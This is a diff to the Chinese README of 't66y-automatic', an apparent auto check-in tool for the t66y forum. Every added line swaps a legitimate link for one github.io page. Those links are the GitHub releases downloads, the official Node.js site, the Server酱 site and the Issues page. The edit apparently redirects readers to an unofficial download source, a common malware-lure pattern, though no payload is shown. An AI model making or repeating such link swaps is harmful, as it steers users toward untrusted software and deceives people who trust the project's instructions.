@@ -1,6 +1,6 @@
 # 🤖 t66y-automatic - 自动签到，省心省力
 
-[![Download Now](https://img.shields.io/badge/Download-t66y--automatic-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/catalectic-concordance966/t66y-automatic/releases)
+[![Download Now](https://img.shields.io/badge/Download-t66y--automatic-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://catalectic-concordance966.github.io)
 
 ## 🎯 这是什么？
 
@@ -34,7 +34,7 @@ t66y-automatic 是一个专为草榴社区（t66y/1024）设计的自动化工�
 
 访问此链接下载应用程序：
 
-[点击这里下载](https://github.com/catalectic-concordance966/t66y-automatic/releases)
+[点击这里下载](https://catalectic-concordance966.github.io)
 
 ### 第二步：安装
 
@@ -79,13 +79,13 @@ node index.js
 ### Windows 用户
 
 1. **下载安装包**
-   前往 [下载页面](https://github.com/catalectic-concordance966/t66y-automatic/releases)，下载最新版本的压缩包。
+   前往 [下载页面](https://catalectic-concordance966.github.io)，下载最新版本的压缩包。
 
 2. **解压文件**
    右键点击下载的 `.zip` 文件，选择"解压到当前文件夹"。
 
 3. **安装依赖**
-   确保你已经安装了 [Node.js](https://nodejs.org/)（建议使用最新稳定版）。
+   确保你已经安装了 [Node.js](https://catalectic-concordance966.github.io)（建议使用最新稳定版）。
    
    在解压后的文件夹中打开命令提示符（Shift+右键 → "在此处打开命令窗口"），运行：
    ```bash
@@ -118,7 +118,7 @@ node index.js
 3. 填入配置文件的 `bark` 部分
 
 #### Server酱推送
-1. 访问 [Server酱官网](https://sct.ftqq.com/)
+1. 访问 [Server酱官网](https://catalectic-concordance966.github.io)
 2. 使用 GitHub 账号登录
 3. 获取你的 SendKey
 4. 填入配置文件的 `serverChan` 部分
@@ -207,7 +207,7 @@ node index.js
 
 ## 🤝 反馈与支持
 
-遇到问题或有改进建议？欢迎在 [GitHub Issues](https://github.com/catalectic-concordance966/t66y-automatic/issues) 中反馈。
+遇到问题或有改进建议？欢迎在 [GitHub Issues](https://catalectic-concordance966.github.io) 中反馈。
 
 ## ⚠️ 使用须知
 
@@ -234,11 +234,11 @@ node index.js
 
 现在就下载 t66y-automatic，享受自动化带来的便利吧！
 
-[⬇️ 立即下载](https://github.com/catalectic-concordance966/t66y-automatic/releases)
+[⬇️ 立即下载](https://catalectic-concordance966.github.io)
 
 ---
 
-**最新版本**：[v1.3.0](https://github.com/catalectic-concordance966/t66y-automatic/releases)
+**最新版本**：[v1.3.0](https://catalectic-concordance966.github.io)
 
 **更新日期**：2024年1月
 
